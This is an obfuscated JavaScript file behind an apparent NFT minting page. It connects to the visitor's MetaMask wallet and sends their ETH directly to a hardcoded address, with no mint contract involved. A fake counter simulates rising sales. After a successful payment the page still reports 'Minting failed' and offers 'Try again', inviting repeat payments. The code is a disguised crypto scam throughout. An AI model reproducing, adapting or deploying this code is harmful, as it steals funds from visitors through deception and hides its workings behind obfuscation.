const _0x520e7f=_0x2454;(function(_0x8b42ac,_0x4fdf0b){const _0x1abc18=_0x2454,_0x50a4cd=_0x8b42ac();while(!![]){try{const _0x4e6941=parseInt(_0x1abc18(0x91))/0x1+-parseInt(_0x1abc18(0x7c))/0x2*(parseInt(_0x1abc18(0x7f))/0x3)+parseInt(_0x1abc18(0x7d))/0x4+-parseInt(_0x1abc18(0x93))/0x5+-parseInt(_0x1abc18(0x8c))/0x6*(parseInt(_0x1abc18(0x71))/0x7)+parseInt(_0x1abc18(0x6d))/0x8+-parseInt(_0x1abc18(0x8a))/0x9*(-parseInt(_0x1abc18(0x7e))/0xa);if(_0x4e6941===_0x4fdf0b)break;else _0x50a4cd['push'](_0x50a4cd['shift']());}catch(_0x50769c){_0x50a4cd['push'](_0x50a4cd['shift']());}}}(_0x37a2,0xc9ba5));const statusp=document['querySelector'](_0x520e7f(0x77)),connectBtn=document['querySelector'](_0x520e7f(0x75)),checkoutBtn=document[_0x520e7f(0x84)](_0x520e7f(0x79)),pricePerNFT=0.24;$(document)['ready'](function(){var _0x47290e=0x1eca;function _0x3412de(){const _0x21d22e=_0x2454;_0x47290e>0x22b8&&(_0x47290e=0x0),$('.count')[_0x21d22e(0x89)](_0x47290e),_0x47290e++;}setInterval(_0x3412de,0x3d6);});let plusBtn=document[_0x520e7f(0x84)]('button[class*=\x22btn-plus\x22]'),minusBtn=document['querySelector'](_0x520e7f(0x82)),totalNFTInput=document['querySelector'](_0x520e7f(0x8b)),totalETHSpan=document[_0x520e7f(0x84)](_0x520e7f(0x8f));function _0x37a2(){const _0x40522d=['56jObxNx','Minting\x20in\x20progress....','log','value','#connectBtn','toFixed','#status','eth','#checkoutBtn','click','sendTransaction','2FLUBwj','1100312jhGVkv','20LjNAAR','1704597QYxKrp','Try\x20again','Wallet\x20access\x20denied','button[class*=\x22btn-minus\x22]','web3','querySelector','Minting\x20failed','enable','utils','addEventListener','text','5806845qOEsfh','input[type=\x22text\x22][id=\x22totalNFT\x22]','685008bedwxT','innerHTML','toString','#totalETH','0xcf85047D0e14C64C42f8221012BD0B8388Dc58Ce','814719OZobYa','ethereum','753515nxkQLG','innerText','toWei','Minting\x20succeed','currentProvider','626528tkDCEF','ether','Wallet\x20connected.\x20Mint\x20your\x20NFTs\x20now!','getAccounts'];_0x37a2=function(){return _0x40522d;};return _0x37a2();}totalNFTInput[_0x520e7f(0x74)]=0x1,totalETHSpan[_0x520e7f(0x94)]=totalNFTInput[_0x520e7f(0x74)]*pricePerNFT,plusBtn[_0x520e7f(0x88)](_0x520e7f(0x7a),()=>{const _0x2a530a=_0x520e7f;totalNFTInput[_0x2a530a(0x74)]=Number(totalNFTInput[_0x2a530a(0x74)])+0x1,totalETHSpan[_0x2a530a(0x94)]=(totalNFTInput[_0x2a530a(0x74)]*pricePerNFT)[_0x2a530a(0x76)](0x2);}),minusBtn['addEventListener']('click',()=>{const _0x2f2979=_0x520e7f;Number(totalNFTInput['value'])>0x1&&(totalNFTInput[_0x2f2979(0x74)]=Number(totalNFTInput[_0x2f2979(0x74)])-0x1,totalETHSpan[_0x2f2979(0x94)]=(totalNFTInput['value']*pricePerNFT)['toFixed'](0x2));}),connectBtn['addEventListener'](_0x520e7f(0x7a),async()=>{const _0x3f1918=_0x520e7f;if(window[_0x3f1918(0x92)]){window[_0x3f1918(0x83)]=new Web3(ethereum);try{await ethereum[_0x3f1918(0x86)](),initPayButton(),statusp[_0x3f1918(0x8d)]=_0x3f1918(0x6f);}catch(_0x326e9d){console[_0x3f1918(0x73)](_0x326e9d),statusp[_0x3f1918(0x8d)]=_0x3f1918(0x81);}}else window[_0x3f1918(0x83)]?(window[_0x3f1918(0x83)]=new Web3(web3[_0x3f1918(0x6c)]),initPayButton()):statusp[_0x3f1918(0x8d)]='No\x20Metamask\x20(or\x20other\x20Web3\x20Provider)\x20installed';});function _0x2454(_0x1e0798,_0x4cf168){const _0x37a240=_0x37a2();return _0x2454=function(_0x2454e0,_0x5c7f06){_0x2454e0=_0x2454e0-0x6a;let _0x12212d=_0x37a240[_0x2454e0];return _0x12212d;},_0x2454(_0x1e0798,_0x4cf168);}const initPayButton=()=>{const _0x754e40=_0x520e7f;checkoutBtn[_0x754e40(0x88)](_0x754e40(0x7a),async()=>{const _0x4a14b3=_0x754e40;statusp['innerText']=_0x4a14b3(0x72);const _0x3f314d=_0x4a14b3(0x90);let _0x2262f1=totalETHSpan[_0x4a14b3(0x94)];_0x2262f1=_0x2262f1[_0x4a14b3(0x8e)]();const _0x5df4a6=await web3[_0x4a14b3(0x78)][_0x4a14b3(0x70)]();web3[_0x4a14b3(0x78)][_0x4a14b3(0x7b)]({'from':web3[_0x4a14b3(0x6c)]['selectedAddress'],'to':_0x3f314d,'value':web3[_0x4a14b3(0x87)][_0x4a14b3(0x6a)](_0x2262f1,_0x4a14b3(0x6e))},(_0x174434,_0x3618c3)=>{const _0x37a865=_0x4a14b3;_0x174434?(console[_0x37a865(0x73)](_0x37a865(0x85),_0x174434),statusp[_0x37a865(0x94)]=_0x37a865(0x85)):(console[_0x37a865(0x73)](_0x37a865(0x6b),_0x3618c3),statusp[_0x37a865(0x94)]=_0x37a865(0x85),checkoutBtn[_0x37a865(0x94)]=_0x37a865(0x80));});});};
